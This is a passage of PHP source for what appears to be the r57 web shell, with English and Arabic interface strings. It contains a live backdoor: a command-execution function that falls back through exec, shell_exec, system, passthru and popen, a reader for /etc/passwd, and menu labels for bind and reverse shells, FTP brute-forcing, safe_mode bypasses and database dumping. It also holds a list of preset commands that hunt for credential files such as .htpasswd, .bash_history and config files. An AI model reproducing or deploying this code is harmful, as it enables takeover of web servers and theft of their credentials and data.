      echo '<tr><td>'.ws(3).'<div align=center><font face=tahoma size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
$lang=array(
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_butt3' =>'Bind',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_butt4' =>'Connect',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_butt5' =>'Run',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_butt6' =>'Change',
'eng_text30'=>'Cat file',
'eng_butt7' =>'Show',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions',
'eng_butt8' =>'Test',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database . Table',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Database',
'eng_text40'=>'Dump database table',
'eng_butt9' =>'Dump',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_butt10'=>'Save',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_butt11'=>'Edit file',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_butt12'=>'Find',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_butt13'=>'Create/Delete',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_butt65'=>'Create',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'Download files from server',
'eng_butt14'=>'Download',
'eng_text87'=>'Download files from remote ftp-server',
'eng_text88'=>'FTP-server:port',
'eng_text89'=>'File on ftp',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without archivation',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'Users list',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'* use username from /etc/passwd for ftp login and password',
'eng_text100'=>'Send file to remote ftp server',
'eng_text101'=>'Use reverse (user -> resu) login for password',
'eng_text102'=>'Mail',
'eng_text103'=>'Send email',
'eng_text104'=>'Send file to email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_butt15'=>'Send',
'eng_text108'=>'Mail',
'eng_text109'=>'Hide',
'eng_text110'=>'Show',
'eng_text111'=>'SQL-Server : Port',
'eng_text112'=>'Test bypass safe_mode with function mb_send_mail',
'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list',
'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body',
'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()',
'eng_text116'=>'Copy from',
'eng_text117'=>'to',
'eng_text118'=>'File copied',
'eng_text119'=>'Cant copy file',
'eng_err0'=>'Error! Can\'t write in file ',
'eng_err1'=>'Error! Can\'t read file ',
'eng_err2'=>'Error! Can\'t create ',
'eng_err3'=>'Error! Can\'t connect to ftp',
'eng_err4'=>'Error! Can\'t login on ftp server',
'eng_err5'=>'Error! Can\'t change dir on ftp',
'eng_err6'=>'Error! Can\'t sent mail',
'eng_err7'=>'Mail send',
'eng_text200'=>'read file from vul copy()',
'eng_text202'=>'where file in server',
'eng_text300'=>'read file from vul curl()',
'eng_text203'=>'read file from vul ini_restore()',
'eng_text204'=>'write shell from vul error_log()',
'eng_text205'=>'write shell in this side',
'eng_text206'=>'read dir',
'eng_text207'=>'read dir from vul reg_glob',
'eng_text208'=>'execute with function',
'eng_text209'=>'read dir from vul root',
'eng_text210'=>'DeZender ',
'eng_text211'=>'::safe_mode off::',
'eng_text212'=>'colse safe_mode with php.ini',
'eng_text213'=>'colse security_mod with .htaccess',
'eng_text214'=>'Admin name',
'eng_text215'=>'IRC server ',
'eng_text216'=>'#room name',
'eng_text217'=>'server',
'eng_text218'=>'write ini.php file to close safe_mode with ini_restore vul',
'eng_text219'=>'Get file to server in safe_mode and change name',
'eng_text220'=>'show file with symlink vul',
'eng_text221'=>'zip file in server to download',
'ar_text222'=>'2 symlink use vul',
'ar_text223'=>'read file from funcution',
'ar_text224'=>'read file from PLUGIN ',

/* --------------------------------------------------------------- */
'ar_text1' =>'«·«„— «·„‰›–',
'ar_text2' =>' ‰›Ì– «·«Ê«„— ›Ì «·”Ì—›—',
'ar_text3' =>'«„— «· ‘€Ì·',
'ar_text4' =>'„ﬂ«‰ ⁄„·ﬂ «·«‰ ⁄·Ï «·”Ì—›—',
'ar_text5' =>'—›⁄ „·› «·Ï «·”Ì—›—',
'ar_text6' =>'„”«— „·›ﬂ',
'ar_text7' =>'«Ê«„— Ã«Â“Â',
'ar_text8' =>'«Œ — «·«„—',
'ar_butt1' =>' ‰›Ì–',
'ar_butt2' =>'—›‹⁄',
'ar_text9' =>'› Õ »Ê—  ›Ì «·”Ì—›— ⁄·Ï /bin/bash',
'ar_text10'=>'»‹Ê— ',
'ar_text11'=>'»«”Ê—œ ··œŒÊ·',
'ar_butt3' =>'› Õ',
'ar_text12'=>'√ ’‹«· ⁄‹ﬂ”Ì',
'ar_text13'=>'«·«Ì »Ì',
'ar_text14'=>'«·„‰›–',
'ar_butt4' =>'√ ‹’«·',
'ar_text15'=>'”Õ» „·›«  «·Ï «·”Ì—›—',
'ar_text16'=>'⁄‰ ÿ—Ìﬁ',
'ar_text17'=>'—«»ÿ «·„·›',
'ar_text18'=>'„ﬂ«‰ ‰“Ê·Â',
'ar_text19'=>'Exploits',
'ar_text20'=>'≈” Œœ„',
'ar_text21'=>'«·«”„ «·ÃœÌœ',
'ar_text22'=>'«‰»Ê» «·»Ì«‰« ',
'ar_text23'=>'«·»Ê—  «·„Õ·Ì',
'ar_text24'=>'«·”Ì—›— «·»⁄Ìœ',
'ar_text25'=>'«·„‰›– «·»⁄Ìœ',
'ar_text26'=>'«” Œœ„',
'ar_butt5' =>' ‘€Ì·',
'ar_text28'=>'«·⁄„· ›Ì «·Ê÷⁄ «·«„‰',
'ar_text29'=>'„„‰Ê⁄ «·œŒÊ·',
'ar_butt6' =>' €Ì—',
'ar_text30'=>'⁄—÷ „·›',
'ar_butt7' =>'⁄—÷',
'ar_text31'=>'«·„·› €Ì— „ÊÃÊœ',
'ar_text32'=>' ‰›Ì– ﬂÊœ php ⁄‰ ÿ—Ìﬁ œ«·Â eval',
'ar_text33'=>'Test bypass open_basedir with cURL functions',
'ar_butt8' =>'«Œ »«—',
'ar_text34'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â include',
'ar_text35'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â Mysql',
'ar_text36'=>'«·ﬁ«⁄œ… . «·ÃœÊ·',
'ar_text37'=>'«”„ «·„” Œœ„',
'ar_text38'=>'ﬂ·„… «·„—Ê—',
'ar_text39'=>'«·ﬁ«⁄œ…',
'ar_text40'=>'‰”Œ… „‰ Ãœ«Ê· «·ﬁ«⁄œ…',
'ar_butt9' =>'‰”Œ…',
'ar_text41'=>'Õ›Ÿ «·‰”Œ… ›Ì',
'ar_text42'=>' ⁄œÌ· «·„·›« ',
'ar_text43'=>'«·„·› «·„—«œ  ⁄œÌ·Â',
'ar_butt10'=>'Õ›Ÿ',
'ar_text44'=>'·« ” ÿÌ⁄ «· ⁄œÌ· ⁄·Ï Â–« «·„·› ›ﬁÿ  ﬁ—√',
'ar_text45'=>' „ «·Õ›Ÿ',
'ar_text46'=>'⁄—÷ phpinfo()',
'ar_text47'=>'—ƒÌ… «·„ €Ì—«  ›Ì php.ini',
'ar_text48'=>'„”Õ „·›«  «·‹ temp',
'ar_butt11'=>' Õ—Ì— «·„·›',
'ar_text49'=>'„”Õ «·”ﬂ—»  „‰ «·”Ì—›—',
'ar_text50'=>'⁄—÷ „⁄·Ê„«  «·–«ﬂ—… «·—∆Ì”Ì…',
'ar_text51'=>'⁄—÷ „⁄·Ê„«  «·–«ﬂ—…',
'ar_text52'=>'»ÕÀ ‰’',
'ar_text53'=>'›Ì «·„”«—',
'ar_text54'=>'»ÕÀ ⁄‰ ‰’ ›Ì «·„·›« ',
'ar_butt12'=>'»ÕÀ',
'ar_text55'=>'›ﬁÿ ›Ì «·„·›« ',
'ar_text56'=>'·«ÌÊÃœ :(',
'ar_text57'=>'«‰‘«¡/„”Õ „·›/„Ã·œ',
'ar_text58'=>'«·«”„',
'ar_text59'=>'„·›',
'ar_text60'=>'„Ã·œ',
'ar_butt13'=>'≈‰‘«¡ /„”Õ',
'ar_text61'=>' „ ≈‰‘«¡ «·„·›',
'ar_text62'=>' „ ≈‰‘«¡ «·„Ã·œ',
'ar_text63'=>' „ „”Õ «·„·›',
'ar_text64'=>' „ „”Õ «·„Ã·œ',
'ar_butt65'=>'≈‰‘«¡',
'ar_text66'=>'„”Õ',
'ar_text67'=>'«· ’—ÌÕ/«·„” Œœ„/«·„Ã„Ê⁄…',
'ar_text68'=>'«„—',
'ar_text69'=>'≈”„ «·„·›',
'ar_text70'=>'«· ’—ÌÕ',
'ar_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'ar_text72'=>'«·‰’ «·„—«œ',
'ar_text73'=>'»ÕÀ ›Ì «·„Ã·œ« ',
'ar_text74'=>'»ÕÀ ›Ì «·„·›« ',
'ar_text75'=>'* you can use regexp',
'ar_text76'=>'«·»ÕÀ ⁄‰ ‰’ ›Ì „·›«  »Ê«”ÿÂ find',
'ar_text80'=>'«·‰Ê⁄',
'ar_text81'=>'«·≈ ’«·« ',
'ar_text82'=>'ﬁÊ«⁄œ «·»Ì«‰« ',
'ar_text83'=>' ‘€Ì· «„— «” ⁄·«„',
'ar_text84'=>'«” ⁄·«„ ﬁ«⁄œ…',
'ar_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'ar_text86'=>' ‰“Ì· „·›«  „‰ «·”Ì—›—',
'ar_butt14'=>' Õ„Ì·',
'ar_text87'=>' ‰“Ì· „·›«  „‰ Œ«œ„ «·«›  Ì »Ì',
'ar_text88'=>'”Ì—›— «·«›  Ì »Ì:«·„‰›–',
'ar_text89'=>'„·› ›Ì «·«›  Ì »Ì',
'ar_text90'=>'«· ÕÊÌ· «·Ï',
'ar_text91'=>'«—‘›…',
'ar_text92'=>'„‰ €Ì— «·«—‘›…',
'ar_text93'=>'«·«›  Ì »Ì',
'ar_text94'=>' Œ„Ì‰ «·«›  Ì »Ì',
'ar_text95'=>'ﬁ«∆„… «·„” Œœ„Ì‰',
'ar_text96'=>'·„ Ì” ÿ⁄ ”Õ» ﬁ«∆„… «·„” Œœ„Ì‰',
'ar_text97'=>' „ «·›Õ’: ',
'ar_text98'=>' „ »‰Ã«Õ: ',
'ar_text99'=>'* «” Œœ„ «”„«¡ «·„” Œœ„Ì‰ ›Ì „·› /etc/passwd ·œŒÊ· ··‹ ftp',
'ar_text100'=>'«—”«· „·› «·Ï Œ«œ„ «·«›  Ì »Ì',
'ar_text101'=>'«” Œœ„ «·«”«„Ì „⁄ﬂÊ”Â · Œ„Ì‰Â«',
'ar_text102'=>'Œœ„«  «·»—Ìœ',
'ar_text103'=>'«—”«· »—Ìœ',
'ar_text104'=>'«—”«· „·› «·Ï «·«Ì„Ì·',
'ar_text105'=>'≈·Ï',
'ar_text106'=>'„‹‰',
'ar_text107'=>'«·„Ê÷Ê⁄',
'ar_butt15'=>'≈—”«·',
'ar_text108'=>'«·—”«·…',
'ar_text109'=>'„Œ›Ì',
'ar_text110'=>'⁄—÷',
'ar_text111'=>'”Ì—›— ﬁÊ«⁄œ «·»Ì«‰«  : «·„‰›–',
'ar_text112'=>'ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ À€—… œ«·Â mb_send_mail',
'ar_text113'=>'ﬁ—«∆… „Õ ÊÏ «·„Ã·œ«  ⁄‰ ÿ—Ìﬁ via imap_list',
'ar_text114'=>'ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ À€—… via imap_body',
'ar_text115'=>'ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ compress.zlib://',
'ar_text116'=>'‰”Œ „‰',
'ar_text117'=>'«·Ï',
'ar_text118'=>' „ ‰”Œ «·„·›',
'ar_text119'=>'·«Ì” ÿÌ⁄ «·‰”Œ',
'ar_err0'=>'Œÿ«¡ ! ·«Ì„ﬂ‰ «·ﬂ «»… ⁄·Ï Â–« «·„·› ',
'ar_err1'=>'Œÿ«¡ ! €Ì— ﬁ«œ— ⁄·Ï ﬁ—«∆Â Â–« «·„·› ',
'ar_err2'=>'Œÿ«¡! ·«Ì„ﬂ‰ «·«‰‘«¡ ',
'ar_err3'=>'Œÿ«¡! €Ì— ﬁ«œ— ⁄·Ï «·« ’«· »«·«›  Ì »Ì',
'ar_err4'=>'Œÿ«¡ ! ·« ” ÿÌ⁄ «·œŒÊ· «·Ï ”Ì—›— «·«›  Ì »Ì',
'ar_err5'=>'Œÿ«¡ ! ·« ” ÿÌ⁄  €Ì— «·„Ã·œ ›Ì «·«›  Ì »Ì',
'ar_err6'=>'Œÿ«¡ ! ·« ” ÿÌ⁄ «—”«· —”«·Â',
'ar_err7'=>'«·»—Ìœ «—”·',
'ar_text200'=>'copy()ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…',
'ar_text202'=>'„”«— «·„·› «·„—«œ ﬁ—«∆ Â',
'ar_text300'=>'curl()ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…',
'ar_text203'=>'ini_restore()ﬁ—«∆… «·„·›«  ⁄‰ ÿ—Ìﬁ À€—…',
'ar_text204'=>'error_log()“—«⁄Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â',
'ar_text205'=>'√“—⁄ «·‘· ⁄·Ï Â–« «·„”«—',
'ar_text206'=>'ﬁ—«∆Â „Õ ÊÌ«  «·„Ã·œ',
'ar_text207'=>'ﬁ—«∆Â „Õ ÊÌ«  «·„Ã·œ«  ⁄‰ ÿ—Ìﬁ À€—Â reg_glob',
'ar_text208'=>' ‰›Ì– «·«Ê«„— ›Ì «·Ê÷⁄ «·«„‰ ⁄‰ ÿ—Ìﬁ «·œÊ«·',
'ar_text209'=>'ﬁ—«∆Â „Õ ÊÌ«  «·„Ã·œ«  ⁄‰ ÿ—Ìﬁ À€—Â root',
'ar_text210'=>'›ﬂ  ‘›Ì— «·“‰œ ',
'ar_text211'=>'::«ﬁ›«· «·”Ì› „Êœ::',
'ar_text212'=>'php.ini «ﬁ›«· «·”Ì› „Êœ ⁄‰ ÿ—Ìﬁ “—⁄ „·›',
'ar_text213'=>'htacces ≈ﬁ›«· «·„Êœ ”ﬂÌÊ— Ì ⁄‰ ÿ—Ìﬁ “—⁄ „·›',
'ar_text214'=>'√”„ «·«œ„‰',
'ar_text215'=>'⁄‰Ê«‰ «·”Ì—›— IRC ',
'ar_text216'=>'# √”„ «·€—›Â „⁄',
'ar_text217'=>'«”„ «·”Ì—›— «·„Œ —ﬁ',
'ar_text218'=>'·≈Ìﬁ«› «·”Ì› „Êœ ini_restore “—⁄ „·› ÌÕ ÊÌ ⁄·Ï À€—Â',
'ar_text219'=>'”Õ» „·›«  «·Ï «·”Ì—›— Ê €Ì— «”„Â« »«·Ê÷⁄ «·«„‰',
'ar_text220'=>'«” ⁄—«÷ «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â symlink «·ŒÿÊÂ «·«Ê·Ï',
'ar_text221'=>'÷€ÿ «·„·›«  · Õ„Ì·Â« „‰ «·„Êﬁ⁄(»⁄œ  Õ„Ì·Â« ·ÃÂ«“ﬂ €Ì— «„ œ«œ «·„·› ·«„ œ«œÂ «·”«»ﬁ)1',
'ar_text222'=>'«” ⁄—«÷ «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â symlink «·ŒÿÊÂ «·À«‰ÌÂ',
'ar_text223'=>'ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ «·œÊ«·',
'ar_text224'=>'PLUGIN ﬁ—«∆Â «·„·›«  ⁄‰ ÿ—Ìﬁ À€—Â ',
);
/*
?????? ??????
????????? ???????? ????????????? ?????? ????? ? ???-?? ??????. ( ??????? ????????? ???? ????????? ???? )
?? ?????? ???? ????????? ??? ???????? ???????.
*/
$aliases=array(
'«·»ÕÀ ⁄‰ „·›«  suid'=>'find / -type f -perm -04000 -ls',
'«·»ÕÀ ⁄‰ „·›«  suid ›Ì «·„Ã·œ «·Õ«·Ì'=>'find . -type f -perm -04000 -ls',
'«·»ÕÀ ⁄‰ „·›«  suid'=>'find / -type f -perm -02000 -ls',
'«·»ÕÀ ⁄‰ „·›«  suid ›Ì «·„Ã·œ «·Õ«·Ì'=>'find . -type f -perm -02000 -ls',
'«·»ÕÀ ⁄‰ „·›«  config.inc.php'=>'find / -type f -name config.inc.php',
'«·»ÕÀ ⁄‰ „·›«  config.inc.php ›Ì «·„Ã·œ «·Õ«·Ì'=>'find . -type f -name config.inc.php',
'«·»ÕÀ ⁄‰ „·›«  config* »Ã„Ì⁄ «·«„ œ«œ« '=>'find / -type f -name "config*"',
'«·»ÕÀ ⁄‰ „·›«  config* ›Ì «·„Ã·œ «·Õ«·Ì'=>'find . -type f -name "config*"',
'«·»ÕÀ ⁄‰ «·„·›«  «·ﬁ«»·… ··ﬂ «»…'=>'find / -type f -perm -2 -ls',
'«·»ÕÀ ⁄‰ «·„·›«  «·ﬁ«»·… ··ﬂ «»… ›Ì «·„Ã·œ «·Õ«·Ì'=>'find . -type f -perm -2 -ls',
'«·»ÕÀ ⁄‰ «·„Ã·œ«  «·ﬁ«»·… ··ﬂ «»…'=>'find /  -type d -perm -2 -ls',
'«·»ÕÀ ⁄‰ «·„Ã·œ«  «·ﬁ«»·… ··ﬂ «»… ›Ì «·„”«— «·Õ«·Ì'=>'find . -type d -perm -2 -ls',
'«·»ÕÀ ⁄‰ „·›«  Ê„Ã·œ«  ﬁ«»·… ··ﬂ «»…'=>'find / -perm -2 -ls',
'«·»ÕÀ ⁄‰ „·›«  Ê„Ã·œ«  ›Ì «·„”«— «·Õ«·Ì'=>'find . -perm -2 -ls',
'«·»ÕÀ ⁄‰ „·›«  service.pwd'=>'find / -type f -name service.pwd',
'«·»ÕÀ ⁄‰ „·›«  service.pwd ›Ì «·„”«— «·Õ«·Ì'=>'find . -type f -name service.pwd',
'«·»ÕÀ ⁄‰ ﬂ· „·›«  «·Ãœ—«‰ «·‰«—Ì… .htpasswd'=>'find / -type f -name .htpasswd',
'«·»ÕÀ ⁄‰ Ã„Ì⁄ „·›«  «·Ãœ—«‰ «·‰«—Ì… ›Ì «·„”«— «·Õ«·Ì'=>'find . -type f -name .htpasswd',
'«·»ÕÀ ⁄‰ Ã„Ì⁄ „·›«  .bash_history'=>'find / -type f -name .bash_history',
'«·»ÕÀ ⁄‰ Ã„Ì⁄ „·›«  .bash_history ›Ì «·„”«— «·Õ«·Ì'=>'find . -type f -name .bash_history',
'«·»ÕÀ ⁄‰ Ã„Ì⁄ „·›«  .mysql_history'=>'find / -type f -name .mysql_history',
'«·»ÕÀ ⁄‰ Ã„Ì⁄ „·›«  .mysql_history ›Ì «·„”«— «·Õ«·Ì'=>'find . -type f -name .mysql_history',
'«·»ÕÀ ⁄‰ Ã„Ì⁄ „·›«  .fetchmailrc'=>'find / -type f -name .fetchmailrc',
'«·»ÕÀ ⁄‰ Ã„Ì⁄ „·›«  .fetchmailrc ›Ì «·„”«— «·Õ«·Ì'=>'find . -type f -name .fetchmailrc',
'«Œ— „·›«  „‘€·Â ›Ì «·‰Ÿ«„'=>'lsattr -va',
'—ƒÌ… «·»Ê— «  «·„› ÊÕ… ›Ì «·”Ì—›—'=>'netstat -an | grep -i listen',
'—ƒÌ… Õ«·… «·„Ã·œ«  Ê«„ﬂ«‰Ì… «· ‰›Ì–'=>'cat /etc/fstab',
'„‘«Âœ… „·› «··Êﬁ ·œŒÊ· «·”Ì »«‰· Ê«·„Ê«ﬁ⁄ ⁄·Ï «·”Ì—›—'=>'cat /var/cpanel/accounting.log',
' ›«’Ì· «·⁄„·Ì«  «· Ì  ⁄„· «·«‰ »«·‰÷«„'=>'ps aux',
'«·„” Œœ„Ì‰ «·„ ’·Ì‰ Õ«·Ì«'=>'w',
'«Œ— „” Œœ„Ì‰ « ’·Ê'=>'lastlog',
'›Õ’ «œÊ«  «·”Õ» wget curl ..etc'=>'which wget curl w3m lynx',
'›Õ’ «œ«… «· —Ã„Â gcc'=>'locate gcc',



'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td bgcolor=#272727><font face=tahoma size=-2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc><tr><td bgcolor=#333333>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Webdings color=gray>4</font>";
$lb = "<font color=black>[</font>";
$rb = "<font color=black>]</font>";
$font = "<font face=tahoma size=-2>";
$ts = "<table class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";

if(isset($_GET['users']))
 {
 if(!$users=get_users()) { echo "<center><font face=tahoma size=-2 color=red>".$lang[$language.'_text96']."</font></center>"; }
 else
  {
  echo '<center>';
  foreach($users as $user) { echo $user."<br>"; }
  echo '</center>';
  }
 echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }

if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $unix=0; else $unix=1;
if(empty($dir))
 {
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); }
 if(empty($os)){ $os ="-"; $unix=1; }
 else
    {
    if(@eregi("^win",$os)) { $unix = 0; }
    else { $unix = 1; }
    }
 }
if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr->SearchText(0,0);
    $res = $sr->GetResultFiles();
    $found = $sr->GetMatchesCount();
    $titles = $sr->GetTitles();
    $r = "";
    if($found > 0)
    {
      $r .= "<TABLE width=100%>";
      foreach($res as $file=>$v)
      {
        $r .= "<TR>";
        $r .= "<TD colspan=2><font face=tahoma size=-2><b>".ws(3);
        $r .= (!$unix)? str_replace("/","\\",$file) : $file;
        $r .= "</b></font></ TD>";
        $r .= "</TR>";
        foreach($v as $a=>$b)
        {
          $r .= "<TR>";
          $r .= "<TD align=center><B><font face=tahoma size=-2>".$a."</font></B></TD>";
          $r .= "<TD><font face=tahoma size=-2>".ws(2).$b."</font></TD>";
          $r .= "</TR>\n";
        }
      }
      $r .= "</TABLE>";
    echo $r;
    }
    else
    {
      echo "<P align=center><B><font face=tahoma size=-2>".$lang[$language.'_text56']."</B></font></P>";
    }
  echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
  }
if(!$safe_mode && strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}
function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}
function get_users()
{
  $users = array();
  $rows=file('/etc/passwd');
  if(!$rows) return 0;
  foreach ($rows as $string)
   {
           $user = @explode(":",$string);
           if(substr($string,0,1)!='#') array_push($users,$user[0]);
   }
  return $users;
}
function err($n,$txt='')
{
echo '<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#000000><font color=red face=tahoma size=-2><div align=center><b>';
echo $GLOBALS['lang'][$GLOBALS['language'].'_err'.$n];
if(!empty($txt)) { echo " $txt"; }
echo '</b></div></font></td></tr></table>';
return null;
}
function perms($mode)
{
if (!$GLOBALS['unix']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function in($type,$name,$size,$value,$checked=0)
{
 $ret = "<input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\"";
 if($checked) $ret .= " checked";
 return $ret.">";
}
function which($pr)
{
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return $pr; }
}
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or err(0);
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}
function sr($l,$t1,$t2)
 {
 return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";
 }
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
